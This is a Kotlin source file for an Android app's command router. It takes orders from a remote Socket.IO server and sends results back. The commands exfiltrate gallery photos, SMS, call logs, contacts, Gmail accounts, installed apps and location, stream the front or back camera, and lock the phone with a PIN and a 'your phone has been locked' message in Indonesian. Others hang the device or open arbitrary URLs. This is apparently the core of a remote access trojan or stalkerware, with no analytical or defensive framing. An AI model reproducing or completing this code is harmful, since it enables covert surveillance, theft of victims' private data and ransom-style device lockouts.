package com.app.cyber

import android.content.Context
import android.content.Intent
import android.net.Uri
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

object CommandRouter {

    private var socket: Socket? = null

    private fun emitData(obj: JSONObject) {
        try {
            if (socket == null || !socket!!.connected()) {
                socket = IO.socket(Config.BaseUrl)
                socket?.connect()
            }
            socket?.emit("device-data", obj)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun route(ctx: Context, data: JSONObject) {
        val action = data.optString("action")
        val payload = data.optJSONObject("payload") ?: JSONObject()

        when (action) {
            "gallery_list"     -> GalleryRechive.listImages(ctx, ::emitData)
            "gallery_get"      -> GalleryRechive.sendImage(ctx, payload.optString("id"), ::emitData)
            "sms_list"         -> SmsRechive.sendAllSms(ctx, ::emitData)
            "call_log"         -> CallRechive.sendAllCalls(ctx, ::emitData)
            "gmail_list"       -> GmailRechive.listAccounts(ctx, ::emitData)
            "app_list"         -> AppsRechive.listApps(ctx, ::emitData)
            "contacts"         -> ContactsRechive.listContacts(ctx, ::emitData)
            "sys_info"         -> SysInfoRechive.getInfo(ctx, ::emitData)
            "location_get"     -> LocationService.sendLast(ctx, ::emitData)
            "flashlight_on"    -> FlashlightController.set(ctx, true)
            "flashlight_blink" -> FlashlightController.blink(ctx, payload.optInt("ms", 300))
            "camera_front"     -> CameraStreamer.start(ctx, 0, ::emitData)
            "camera_back"      -> CameraStreamer.start(ctx, 1, ::emitData)
            "camera_stop"      -> CameraStreamer.stop()
            "lock_start"       -> LockService.start(ctx, payload.optString("pin", "123456"), payload.optString("message", "HP ANDA TELAH DI LOCK"))
            "lock_stop"        -> LockService.stop(ctx)
            "hang_start"       -> HangDevice.start(ctx)
            "hang_stop"        -> HangDevice.stop(ctx)
            "open_url"         -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                }
            }
        }
    }
}
